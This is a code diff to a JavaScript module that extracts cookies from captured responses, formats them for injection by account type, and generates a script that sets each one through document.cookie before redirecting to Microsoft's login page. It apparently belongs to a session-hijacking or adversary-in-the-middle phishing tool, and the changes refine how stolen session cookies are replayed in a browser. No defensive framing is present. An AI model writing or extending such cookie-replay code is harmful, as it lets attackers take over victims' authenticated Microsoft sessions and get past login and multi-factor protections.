@@ -309,14 +309,10 @@ function extractCookiesFromResponse(cookieList, response, url) {
 }
 
 /**
- * Format cookies for browser injection
+ * Format cookies for browser injection - returns semicolon-separated string
  */
 function formatCookiesForInjection(cookies, accountType) {
   const cookieStrings = [];
-  const expiryDate = new Date();
-  expiryDate.setFullYear(expiryDate.getFullYear() + 100);
-  const expiresStr = expiryDate.toUTCString();
-
   for (const cookie of cookies) {
     if (!cookie.name || !cookie.value) continue;
     let cookieStr = `${cookie.name}=${cookie.value}`;
@@ -326,17 +322,20 @@ function formatCookiesForInjection(cookies, accountType) {
     cookieStr += '; secure';
     cookieStrings.push(cookieStr);
   }
-  return cookieStrings;
+  return cookieStrings.join("; ");
 }
 
 /**
  * Generate JavaScript code that injects cookies into the browser
  */
 function generateCookieInjectionScript(cookies) {
-  if (!cookies || !cookies.success || !cookies.cookies || cookies.cookies.length === 0) { return ''; }
+  if (!cookies || !cookies.success || !cookies.cookies) { return ''; }
+  const cookieList = Array.isArray(cookies.cookies) ? cookies.cookies : cookies.cookies.split('; ').filter(c => c.trim());
   let statement = '';
-  cookies.forEach(function(cookieStr) { statement += `document.cookie = "${cookieStr}";\n`; });
-  const redirectScript = '// Redirect after 3s\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);';
+  for (const cookieStr of cookieList) {
+    if (cookieStr) { statement += `document.cookie = "${cookieStr}";\n`; }
+  }
+  const redirectScript = '// Redirect after 3s\nsetTimeout(() => {\n window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);';
   return statement + '\n' + redirectScript;
 }
 
